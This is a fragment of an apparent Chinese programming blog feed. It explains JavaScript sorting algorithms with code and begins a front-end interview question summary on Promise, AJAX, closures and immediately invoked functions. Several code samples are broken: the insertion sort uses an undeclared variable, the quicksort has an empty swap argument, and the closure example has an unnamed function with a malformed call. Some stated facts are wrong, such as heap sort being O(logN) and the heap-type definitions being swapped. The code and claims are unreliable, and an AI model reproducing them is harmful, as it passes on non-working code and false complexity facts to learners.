src="https://i.imgur.com/TplSwHr.gif" alt=""><br>该算法的操作次数是一个等差数列 <code>n + (n - 1) + (n - 2) + 1</code> ，去掉常数项以后得出时间复杂度是<code>O(n * n)</code></p><blockquote><p>二、插入排序</p></blockquote><p>原理：默认第一个数是已经排好了的，取出第二个数和第一个数比较，大的往后，小的在前；第三个数和此时第二个数+第一个数（之前所有的数）比较，以此类推。<br>代码实现：<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertSort</span><span class="params">(arry)</span></span>&#123;</div><div class="line">  checkArray(<span class="keyword">array</span>);</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="keyword">array</span>.length; i++) &#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span> &amp;&amp; <span class="keyword">array</span>[j] &gt; <span class="keyword">array</span>[j+<span class="number">1</span>]; j--) &#123;</div><div class="line">      swap(<span class="keyword">array</span>, j, j+<span class="number">1</span>)</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">array</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/CxZXZea.gif" alt=""><br>该算法的操作次数是一个等差数列 <code>n + (n - 1) + (n - 2) + 1</code> ，去掉常数项以后得出时间复杂度是 <code>O(n * n)</code></p><blockquote><p>三、选择排序</p></blockquote><p>原理：假定第一个数是最小值，遍历剩余数组，找出比它小的(最小的)数值；找得到就是新数字是最小值，找不到还是假定值是最小值；确定了真正的最小值了，就可以从第二个数字开始遍历<br>代码实现：<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectSort</span><span class="params">(array)</span></span>&#123;</div><div class="line">  checkArray(<span class="keyword">array</span>);</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="keyword">array</span>.length - <span class="number">1</span>; i++)&#123;</div><div class="line">    <span class="comment">// 从 0 到 倒数第二个</span></div><div class="line">    <span class="keyword">let</span> minIndex = i;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; <span class="keyword">array</span>.length; j++)&#123;</div><div class="line">      <span class="comment">// 从 第一个 到 最后一个</span></div><div class="line">      minIndex = <span class="keyword">array</span>[j] &lt; <span class="keyword">array</span>[minIndex] ? j : minIndex;</div><div class="line">      <span class="comment">// 最小的值 = 和 j 比较后 最小的那个值</span></div><div class="line">    &#125;</div><div class="line">    swap(<span class="keyword">array</span>, i, minIndex);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">array</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/R739A83.gif" alt=""><br>该算法的操作次数是一个等差数列 <code>n + (n - 1) + (n - 2) + 1</code> ，去掉常数项以后得出时间复杂度是 <code>O(n * n)</code></p><blockquote><p>四、归并排序</p></blockquote><p>原理：递归的将数组两两分开直到最多包含两个元素，然后将数组排序合并，最终合并为排序好的数组。假设我有一组数组 [3, 1, 2, 8, 9, 7, 6]，中间数索引是 3，先排序数组 [3, 1, 2, 8] 。在这个左边数组上，继续拆分直到变成数组包含两个元素（如果数组长度是奇数的话，会有一个拆分数组只包含一个元素）。然后排序数组 [3, 1] 和 [2, 8] ，然后再排序数组 [1, 3, 2, 8] ，这样左边数组就排序完成，然后按照以上思路排序右边数组，最后将数组 [1, 2, 3, 8] 和 [6, 7, 9] 排序。<br>代码实现：<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sort</span><span class="params">(array)</span> </span>&#123;</div><div class="line">  checkArray(<span class="keyword">array</span>);</div><div class="line">  mergeSort(<span class="keyword">array</span>, <span class="number">0</span>, <span class="keyword">array</span>.length - <span class="number">1</span>);</div><div class="line">  <span class="keyword">return</span> <span class="keyword">array</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span><span class="params">(array, left, right)</span> </span>&#123;</div><div class="line">  <span class="keyword">if</span> (left === right) <span class="keyword">return</span>;</div><div class="line">  <span class="comment">// 左右索引相同说明已经只有一个数</span></div><div class="line">  <span class="keyword">let</span> mid = parseInt(left + ((right - left) &gt;&gt; <span class="number">1</span>));</div><div class="line">  <span class="comment">// 等同于 `left + (right - left) / 2`</span></div><div class="line">  <span class="comment">// 相比 `(left + right) / 2` 来说更加安全，不会溢出</span></div><div class="line">  <span class="comment">// 使用位运算是因为位运算比四则运算快</span></div><div class="line">  mergeSort(<span class="keyword">array</span>, left, mid);</div><div class="line">  mergeSort(<span class="keyword">array</span>, mid + <span class="number">1</span>, right);</div><div class="line"></div><div class="line">  <span class="keyword">let</span> help = [];</div><div class="line">  <span class="keyword">let</span> i = <span class="number">0</span>;</div><div class="line">  <span class="keyword">let</span> p1 = left;</div><div class="line">  <span class="keyword">let</span> p2 = mid + <span class="number">1</span>;</div><div class="line">  <span class="keyword">while</span> (p1 &lt;= mid &amp;&amp; p2 &lt;= right) &#123;</div><div class="line">    help[i++] = <span class="keyword">array</span>[p1] &lt; <span class="keyword">array</span>[p2] ? <span class="keyword">array</span>[p1++] : <span class="keyword">array</span>[p2++];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">while</span> (p1 &lt;= mid) &#123;</div><div class="line">    help[i++] = <span class="keyword">array</span>[p1++];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">while</span> (p2 &lt;= right) &#123;</div><div class="line">    help[i++] = <span class="keyword">array</span>[p2++];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; help.length; i++) &#123;</div><div class="line">    <span class="keyword">array</span>[left + i] = help[i];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">array</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>以上算法使用了递归的思想。递归的本质就是压栈，每递归执行一次函数，就将该函数的信息（比如参数，内部的变量，执行到的行数）压栈，直到遇到终止条件，然后出栈并继续执行函数。对于以上递归函数的调用轨迹如下：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mergeSort(data, <span class="number">0</span>, <span class="number">6</span>) <span class="comment">// mid = 3</span></div><div class="line">  mergeSort(data, <span class="number">0</span>, <span class="number">3</span>) <span class="comment">// mid = 1</span></div><div class="line">    mergeSort(data, <span class="number">0</span>, <span class="number">1</span>) <span class="comment">// mid = 0</span></div><div class="line">      mergeSort(data, <span class="number">0</span>, <span class="number">0</span>) <span class="comment">// 遇到终止，回退到上一步</span></div><div class="line">    mergeSort(data, <span class="number">1</span>, <span class="number">1</span>) <span class="comment">// 遇到终止，回退到上一步</span></div><div class="line">    <span class="comment">// 排序 p1 = 0, p2 = mid + 1 = 1</span></div><div class="line">    <span class="comment">// 回退到 `mergeSort(data, 0, 3)` 执行下一个递归</span></div><div class="line">  mergeSort(<span class="number">2</span>, <span class="number">3</span>) <span class="comment">// mid = 2</span></div><div class="line">    mergeSort(<span class="number">3</span>, <span class="number">3</span>) <span class="comment">// 遇到终止，回退到上一步</span></div><div class="line">  <span class="comment">// 排序 p1 = 2, p2 = mid + 1 = 3</span></div><div class="line">  <span class="comment">// 回退到 `mergeSort(data, 0, 3)` 执行合并逻辑</span></div><div class="line">  <span class="comment">// 排序 p1 = 0, p2 = mid + 1 = 2</span></div><div class="line">  <span class="comment">// 执行完毕回退</span></div><div class="line">  <span class="comment">// 左边数组排序完毕，右边也是如上轨迹</span></div></pre></td></tr></table></figure></p><p>该算法的操作次数是可以这样计算：递归了两次，每次数据量是数组的一半，并且最后把整个数组迭代了一次，所以得出表达式 2T(N / 2) + T(N) （T 代表时间，N 代表数据量）。根据该表达式可以套用 该公式 得出时间复杂度为 O(N * logN)<br><img src="https://i.imgur.com/beqzC1d.gif" alt=""></p><blockquote><p>五、快排</p></blockquote><p>原理：随机选取一个数组中的值作为基准值，从左至右取值与基准值对比大小。比基准值小的放数组左边，大的放右边，对比完成后将基准值和第一个比基准值大的值交换位置。然后将数组以基准值的位置分为两部分，继续递归以上操作。<br>代码实现：<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">function <span class="built_in">sort</span>(array) &#123;</div><div class="line">  checkArray(array);</div><div class="line">  <span class="built_in">quickSort</span>(array, <span class="number">0</span>, array.length - <span class="number">1</span>);</div><div class="line">  <span class="keyword">return</span> array;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function <span class="built_in">quickSort</span>(array, <span class="keyword">left</span>, <span class="keyword">right</span>) &#123;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">left</span> &lt; <span class="keyword">right</span>) &#123;</div><div class="line">    <span class="built_in">swap</span>(array, , <span class="keyword">right</span>)</div><div class="line">    <span class="comment">// 随机取值，然后和末尾交换，这样做比固定取一个位置的复杂度略低</span></div><div class="line">    <span class="keyword">let</span> indexs = part(array, parseInt(<span class="type">Math</span>.random() * (<span class="keyword">right</span> - <span class="keyword">left</span> + <span class="number">1</span>)) + <span class="keyword">left</span>, <span class="keyword">right</span>);</div><div class="line">    <span class="built_in">quickSort</span>(array, <span class="keyword">left</span>, indexs[<span class="number">0</span>]);</div><div class="line">    <span class="built_in">quickSort</span>(array, indexs[<span class="number">1</span>] + <span class="number">1</span>, <span class="keyword">right</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">function part(array, <span class="keyword">left</span>, <span class="keyword">right</span>) &#123;</div><div class="line">  <span class="keyword">let</span> less = <span class="keyword">left</span> - <span class="number">1</span>;</div><div class="line">  <span class="keyword">let</span> more = <span class="keyword">right</span>;</div><div class="line">  <span class="keyword">while</span> (<span class="keyword">left</span> &lt; more) &#123;</div><div class="line">    <span class="keyword">if</span> (array[<span class="keyword">left</span>] &lt; array[<span class="keyword">right</span>]) &#123;</div><div class="line">      <span class="comment">// 当前值比基准值小，`less` 和 `left` 都加一</span></div><div class="line">   ++less;</div><div class="line">       ++<span class="keyword">left</span>;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (array[<span class="keyword">left</span>] &gt; array[<span class="keyword">right</span>]) &#123;</div><div class="line">      <span class="comment">// 当前值比基准值大，将当前值和右边的值交换</span></div><div class="line">      <span class="comment">// 并且不改变 `left`，因为当前换过来的值还没有判断过大小</span></div><div class="line">      <span class="built_in">swap</span>(array, --more, <span class="keyword">left</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="comment">// 和基准值相同，只移动下标</span></div><div class="line">      <span class="keyword">left</span>++;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// 将基准值和比基准值大的第一个值交换位置</span></div><div class="line">  <span class="comment">// 这样数组就变成 `[比基准值小, 基准值, 比基准值大]`</span></div><div class="line">  <span class="built_in">swap</span>(array, <span class="keyword">right</span>, more);</div><div class="line">  <span class="keyword">return</span> [less, more];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>该算法的复杂度和归并排序是相同的，但是额外空间复杂度比归并排序少，只需 O(logN)，并且相比归并排序来说，所需的常数时间也更少。<br><img src="https://i.imgur.com/CJkbSuw.gif" alt=""></p><blockquote><p>六、计数排序</p></blockquote><p><img src="https://i.imgur.com/hX1CFZV.gif" alt=""></p><blockquote><p>七、堆排序</p></blockquote><p>原理：堆排序<br>堆排序利用了二叉堆的特性来做，二叉堆通常用数组表示，并且二叉堆是一颗完全二叉树（所有叶节点（最底层的节点）都是从左往右顺序排序，并且其他层的节点都是满的）。二叉堆又分为大根堆与小根堆。</p><ul><li>大根堆是某个节点的所有子节点的值都比他小</li><li>小根堆是某个节点的所有子节点的值都比他大<br>堆排序的原理就是组成一个大根堆或者小根堆。以小根堆为例，某个节点的左边子节点索引是 i <em> 2 + 1，右边是 i </em> 2 + 2，父节点是 (i - 1) /2。</li></ul><p>1、首先遍历数组，判断该节点的父节点是否比他小，如果小就交换位置并继续判断，直到他的父节点比他大<br>2、重新以上操作 1，直到数组首位是最大值<br>3、然后将首位和末尾交换位置并将数组长度减一，表示数组末尾已是最大值，不需要再比较大小<br>4、对比左右节点哪个大，然后记住大的节点的索引并且和父节点对比大小，如果子节点大就交换位置<br>5、重复以上操作 3 - 4 直到整个数组都是大根堆。<br>代码实现：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">function heap(<span class="keyword">array</span>) &#123;</div><div class="line">  checkArray(<span class="keyword">array</span>);</div><div class="line">  <span class="comment">// 将最大值交换到首位</span></div><div class="line">  <span class="built_in">for</span> (let i = <span class="number">0</span>; i &lt; <span class="keyword">array</span>.length; i++) &#123;</div><div class="line">    heapInsert(<span class="keyword">array</span>, i);</div><div class="line">  &#125;</div><div class="line">  let <span class="built_in">size</span> = <span class="keyword">array</span>.length;</div><div class="line">  <span class="comment">// 交换首位和末尾</span></div><div class="line">  swap(<span class="keyword">array</span>, <span class="number">0</span>, --<span class="built_in">size</span>);</div><div class="line">  <span class="built_in">while</span> (<span class="built_in">size</span> &gt; <span class="number">0</span>) &#123;</div><div class="line">    heapify(<span class="keyword">array</span>, <span class="number">0</span>, <span class="built_in">size</span>);</div><div class="line">    swap(<span class="keyword">array</span>, <span class="number">0</span>, --<span class="built_in">size</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">return</span> <span class="keyword">array</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function heapInsert(<span class="keyword">array</span>, index) &#123;</div><div class="line">  <span class="comment">// 如果当前节点比父节点大，就交换</span></div><div class="line">  <span class="built_in">while</span> (<span class="keyword">array</span>[index] &gt; <span class="keyword">array</span>[<span class="built_in">parseInt</span>((index - <span class="number">1</span>) / <span class="number">2</span>)]) &#123;</div><div class="line">    swap(<span class="keyword">array</span>, index, <span class="built_in">parseInt</span>((index - <span class="number">1</span>) / <span class="number">2</span>));</div><div class="line">    <span class="comment">// 将索引变成父节点</span></div><div class="line">    index = <span class="built_in">parseInt</span>((index - <span class="number">1</span>) / <span class="number">2</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">function heapify(<span class="keyword">array</span>, index, <span class="built_in">size</span>) &#123;</div><div class="line">  let left = index * <span class="number">2</span> + <span class="number">1</span>;</div><div class="line">  <span class="built_in">while</span> (left &lt; <span class="built_in">size</span>) &#123;</div><div class="line">    <span class="comment">// 判断左右节点大小</span></div><div class="line">    let largest =</div><div class="line">      left + <span class="number">1</span> &lt; <span class="built_in">size</span> &amp;&amp; <span class="keyword">array</span>[left] &lt; <span class="keyword">array</span>[left + <span class="number">1</span>] ? left + <span class="number">1</span> : left;</div><div class="line">    <span class="comment">// 判断子节点和父节点大小</span></div><div class="line">    largest = <span class="keyword">array</span>[index] &lt; <span class="keyword">array</span>[largest] ? largest : index;</div><div class="line">    <span class="built_in">if</span> (largest === index) <span class="built_in">break</span>;</div><div class="line">    swap(<span class="keyword">array</span>, index, largest);</div><div class="line">    index = largest;</div><div class="line">    left = index * <span class="number">2</span> + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>以上代码实现了小根堆，如果需要实现大根堆，只需要把节点对比反一下就好。该算法的复杂度是 O(logN)<br><img src="https://i.imgur.com/LbPIhff.gif" alt=""></p><p>每个语言的排序内部实现都是不同的。</p><p>对于 JS 来说，数组长度大于 10 会采用快排，否则使用插入排序 。选择插入排序是因为虽然时间复杂度很差，但是在数据量很小的情况下和 O(N * logN)相差无几，然而插入排序需要的常数时间很小，所以相对别的排序来说更快。</p><p>对于 Java 来说，还会考虑内部的元素的类型。对于存储对象的数组来说，会采用稳定性好的算法。稳定性的意思就是对于相同值来说，相对顺序不能改变。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt; 准备&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1、时间复杂度：&lt;/p&gt;
&lt;p&gt;通常使用最差的时间复杂度来衡量一个算法的好坏。&lt;/p&gt;
&lt;p&gt;常数时间 O(1) 代表这个操作和数据量没关系，是一个固定时间的操作，比如说四则运算。&lt;/p&gt;
&lt;p&gt;对于一个算法来说，可能会计算出如下操作次数 &lt;code&gt;aN + 1&lt;/code&gt;，&lt;code&gt;N&lt;/code&gt; 代表数据量。那么该算法的时间复杂度就是 &lt;code&gt;O(N)&lt;/code&gt;。因为我们在计算时间复杂度的时候，数据量通常是非常大的，这时候低阶项和常数项可以忽略不计。&lt;/p&gt;
&lt;p&gt;当然可能会出现两个算法都是 &lt;code&gt;O(N)&lt;/code&gt; 的时间复杂度，那么对比两个算法的好坏就要通过对比低阶项和常数项了。&lt;/p&gt;
&lt;p&gt;2、以下两个函数是本章节经常会用到的：&lt;br&gt;&lt;figure class=&quot;highlight vbscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; checkArray(&lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt; || &lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;.length &amp;lt;= &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) return&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; swap(&lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;left&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;right&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; rightValue = &lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;[&lt;span class=&quot;built_in&quot;&gt;right&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;[&lt;span class=&quot;built_in&quot;&gt;right&lt;/span&gt;] = &lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;[&lt;span class=&quot;built_in&quot;&gt;left&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;array&lt;/span&gt;[&lt;span class=&quot;built_in&quot;&gt;left&lt;/span&gt;] = rightValue&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>前端总结2</title>
    <link href="wangsiyuan233.github.io/2018/07/17/61%E5%89%8D%E7%AB%AF%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%932/"/>
    <id>wangsiyuan233.github.io/2018/07/17/61前端题目总结2/</id>
    <published>2018-07-17T07:52:52.000Z</published>
    <updated>2018-09-20T03:37:15.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><blockquote><p>JS 有哪些数据类型？</p></blockquote><p>七个小矮子：<code>string</code> <code>number</code> <code>bool</code> <code>undefined</code> <code>null</code> <code>object</code> <code>symbol</code><br><code>object</code> 包括了数组、函数、正则、日期等对象<br>一旦出现（数组、函数、正则、日期、NaN）直接0分</p><blockquote><p>（必考） Promise 怎么使用？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/04/02/36%E5%BC%82%E6%AD%A5%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">深入理解JavaScript–异步系列(2)</a><br><a id="more"></a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//then</span></div><div class="line">  $.ajax(...).then(成功函数, 失败函数)</div><div class="line"></div><div class="line"><span class="comment">//链式 then</span></div><div class="line">  $.ajax(...).then(成功函数, 失败函数).then(成功函数<span class="number">2</span>, 失败函数<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="comment">//如何自己生成 Promise 对象</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">xxx</span>(<span class="params"></span>)</span>&#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</div><div class="line">          setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</div><div class="line">              resolve() 或者 reject()</div><div class="line">          &#125;,<span class="number">3000</span>)</div><div class="line">      &#125;)</div><div class="line">  &#125;</div><div class="line">  xxx().then(...)</div></pre></td></tr></table></figure></p><blockquote><p>（必考） AJAX 手写一下？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/02/17/16AJAX%EF%BC%88%E4%B8%80%EF%BC%89/" target="_blank" rel="external">封装一个ajax</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</div><div class="line">xhr.open(<span class="string">'POST'</span>, <span class="string">'/xxxx'</span>)</div><div class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span>)&#123;</div><div class="line">        <span class="built_in">console</span>.log(xhr.responseText)</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">xhr.send(<span class="string">'a=1&amp;b=2'</span>)</div></pre></td></tr></table></figure></p><blockquote><p>（必考）闭包是什么？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/03/08/28%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-1/" target="_blank" rel="external">深入理解JavaScript–闭包系列(1)</a><br><a href="https://wangsiyuan233.cn/2018/03/26/29%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">深入理解JavaScript–闭包系列(2)</a><br><a href="https://wangsiyuan233.cn/2018/03/27/28%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">深入理解JavaScript–闭包系列(3)</a><br><a href="https://wangsiyuan233.cn/2018/03/28/28%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-4/" target="_blank" rel="external">深入理解JavaScript–闭包系列(4)</a><br><a href="https://zhuanlan.zhihu.com/p/22486908" target="_blank" rel="external">JS 中的闭包是什么？</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> n = <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        n += <span class="number">1</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">let</span>  adder = ()</div><div class="line">adder() <span class="comment">// n === 1</span></div><div class="line">adder() <span class="comment">// n === 2</span></div><div class="line"><span class="built_in">console</span>.log(n) <span class="comment">// n is not defined</span></div></pre></td></tr></table></figure></p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li>定义：「函数」和「函数内部能访问到的变量」（也叫环境）的总和，就是一个闭包。</li><li>作用：闭包常常用来「间接访问一个变量」。换句话说，「隐藏一个变量」。</li><li>IE 有 bug，IE 在我们使用完闭包之后，依然回收不了闭包里面引用的变量。<blockquote><p>（必考）这段代码里的 this 是什么？</p></blockquote></li></ul><p><a href="https://wangsiyuan233.cn/2018/03/05/27%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">聊聊系列(2)–this</a></p><blockquote><p>（必考）什么是立即执行函数？使用立即执行函数的目的是什么？</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/22465092" target="_blank" rel="external">方应航–立即执行函数</a><br>ES 6 新语法 <code>{let  name}</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">;(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;())</div><div class="line">;(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;)()</div><div class="line">!!!!!!!<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;()</div><div class="line">~<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;()</div></pre></td></tr></table></figure></p><h2 id="★30s总结-1"><a href="#★30s总结-1" class="headerlink" 